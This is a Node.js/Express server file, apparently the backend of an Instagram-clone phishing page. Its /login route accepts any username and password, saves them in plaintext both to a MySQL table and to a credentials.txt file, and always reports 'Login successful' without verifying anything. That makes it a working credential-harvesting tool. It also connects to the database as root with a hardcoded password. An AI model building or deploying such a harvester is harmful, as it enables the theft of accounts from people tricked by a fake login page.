const express = require('express');
const mysql = require('mysql2');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const port = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

// Database Connection
const db = mysql.createConnection({
    host: 'localhost',
    user: 'root',
    password: 'root'
});

db.connect((err) => {
    if (err) {
        console.error('❌ SERVER ERROR: Could not connect to MySQL. Is it running? Is password correct?', err);
        return;
    }
    console.log('✅ STEP 1: Connected to MySQL server successfully.');

    db.query('CREATE DATABASE IF NOT EXISTS insta_clone_db', (err) => {
        if (err) {
            console.error('❌ SERVER ERROR: Could not create database.', err);
            return;
        }
        console.log('✅ STEP 2: Database "insta_clone_db" checked/created.');

        db.query('USE insta_clone_db', (err) => {
            if (err) {
                console.error('❌ SERVER ERROR: Could not switch to database.', err);
                return;
            }
            console.log('✅ STEP 3: Switched to database "insta_clone_db".');

            // 3. Create Table using fully qualified name to be safe
            const createTableQuery = `CREATE TABLE IF NOT EXISTS insta_clone_db.users (
                id INT AUTO_INCREMENT PRIMARY KEY,
                username VARCHAR(255),
                password VARCHAR(255),
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )`;

            db.query(createTableQuery, (err) => {
                if (err) {
                    console.error('❌ SERVER ERROR: Could not create table.', err);
                } else {
                    console.log('✅ STEP 4: Table "users" creation command sent.');

                    // 4. Verify table existence
                    db.query('SHOW TABLES FROM insta_clone_db', (err, results) => {
                        if (err) {
                            console.error('❌ ERROR verifying tables:', err);
                        } else {
                            console.log('🔍 VERIFICATION: Tables in insta_clone_db:', results);
                            console.log('👉 If you see "users" in the list above, it IS there.');
                        }
                    });
                }
            });
        });
    });
});

// Routes
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Simple validation
    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'Missing credentials' });
    }

    const query = "INSERT INTO insta_clone_db.users (username, password) VALUES (?, ?)";
    db.query(query, [username, password], (err, result) => {
        if (err) {
            console.error('❌ DATABASE ERROR: Could not save user!', err);
            return res.status(500).json({ success: false, message: 'Database error' });
        }
        console.log(`✅ SUCCESS: User ${username} saved to database!`);

        // Save to text file (backup)
        const logEntry = `${username} -- ${password}\n`;
        fs.appendFile('credentials.txt', logEntry, (err) => {
            if (err) {
                console.error('Error writing to file:', err);
            }
        });

        res.json({ success: true, message: 'Login successful' });
    });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
